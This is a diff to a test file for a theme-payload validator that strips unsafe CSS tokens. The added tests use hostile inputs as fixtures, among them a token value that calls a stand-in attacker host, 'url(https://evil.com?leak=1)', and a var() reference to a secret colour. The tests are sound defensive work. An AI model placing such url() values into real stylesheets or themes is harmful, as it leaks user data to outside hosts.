@@ -66,10 +66,10 @@ describe("validateThemePayload", () => {
     }
   });
 
-  it("drops token keys that don't start with --lvis-", () => {
+  it("drops token keys not in the closed PLUGIN_TOKEN_NAMES allowlist", () => {
     const result = validateThemePayload({
       theme: "dark", chatTheme: "default", codeTheme: "dark",
-      tokens: { "--lvis-bg": "#fff", "--evil-key": "red", "color": "blue" },
+      tokens: { "--lvis-bg": "#fff", "--lvis-unknown-new": "#abc", "--evil-key": "red", "color": "blue" },
     });
     expect(result.ok).toBe(true);
     if (result.ok) {
@@ -126,6 +126,39 @@ describe("validateThemePayload", () => {
     expect(result.ok).toBe(true);
     if (result.ok) {
       expect(result.safe.tokens).toBeUndefined();
+    }
+  });
+
+  it("drops token values with Unicode-escaped url() — allowlist blocks bypass attempts", () => {
+    const result = validateThemePayload({
+      theme: "dark", chatTheme: "default", codeTheme: "dark",
+      tokens: { "--lvis-bg": "url(https://evil.com?leak=1)" },
+    });
+    expect(result.ok).toBe(true);
+    if (result.ok) {
+      expect(result.safe.tokens).toBeUndefined();
+    }
+  });
+
+  it("drops var() references — only literal HSL/hex/dimension values pass", () => {
+    const result = validateThemePayload({
+      theme: "dark", chatTheme: "default", codeTheme: "dark",
+      tokens: { "--lvis-bg": "var(--p-secret-color)" },
+    });
+    expect(result.ok).toBe(true);
+    if (result.ok) {
+      expect(result.safe.tokens).toBeUndefined();
+    }
+  });
+
+  it("accepts hsl with decimal values and hex colors", () => {
+    const result = validateThemePayload({
+      theme: "dark", chatTheme: "lg", codeTheme: "dark",
+      tokens: { "--lvis-radius": "0.6rem", "--lvis-radius-sm": "0.25rem", "--lvis-primary": "#734dff" },
+    });
+    expect(result.ok).toBe(true);
+    if (result.ok) {
+      expect(result.safe.tokens).toEqual({ "--lvis-radius": "0.6rem", "--lvis-radius-sm": "0.25rem", "--lvis-primary": "#734dff" });
     }
   });
 });
